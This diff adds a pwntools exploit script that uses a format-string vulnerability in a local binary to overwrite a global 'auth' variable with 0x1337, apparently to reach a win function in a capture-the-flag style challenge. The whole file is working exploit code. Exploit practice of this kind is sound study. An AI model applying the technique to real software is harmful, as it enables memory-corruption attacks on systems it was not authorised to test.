@@ -1,0 +1,60 @@
+```python
+import argparse
+import os
+import sys
+from pwn import *
+
+def exploit(binary_path):
+    # Set pwntools context for the target architecture
+    context.arch = 'amd64'
+    context.os = 'linux'
+    context.endian = 'little'
+    context.word_size = 64
+
+    # Target address to write to: global variable 'auth'
+    # From analysis: 0x40406c <auth>
+    AUTH_ADDR = 0x40406c
+
+    # The value to write to 'auth' to trigger the win function
+    # From analysis: cmp eax,0x1337
+    TARGET_VALUE = 0x1337
+
+    # Format string offset.
+    # Based on `run_with_stdin` output:
+    # AAAA.0x1.(nil).0xa.(nil).(nil).0x2e70252e41414141
+    # The 6th %p outputs 0x2e70252e41414141, which is "AAAA.%p." in little-endian.
+    # This confirms our input buffer starts exactly at offset 6.
+    FMT_OFFSET = 6
+
+    # Generate the format string payload using pwntools' fmtstr_payload
+    # We want to write TARGET_VALUE (0x1337) to AUTH_ADDR (0x40406c)
+    payload = fmtstr_payload(FMT_OFFSET, {AUTH_ADDR: TARGET_VALUE}, write_size='short')
+
+    # Start the target binary
+    p = process(binary_path)
+
+    # Receive the initial prompt "Name:"
+    p.recvuntil(b"Name:")
+
+    # Send the generated payload
+    p.sendline(payload)
+
+    # Receive all output from the process
+    output = p.recvall(timeout=2)
+
+    # Print the captured output
+    sys.stdout.buffer.write(output)
+
+    # Close the process
+    p.close()
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser()
+    parser.add_argument('binary', nargs='?', default=None)
+    parser.add_argument('--binary', dest='binary_flag', default=None)
+    args = parser.parse_args()
+    binary = args.binary_flag or args.binary or os.environ.get('TARGET_BINARY')
+    if not binary:
+        raise SystemExit('missing binary path')
+    exploit(binary)
+```
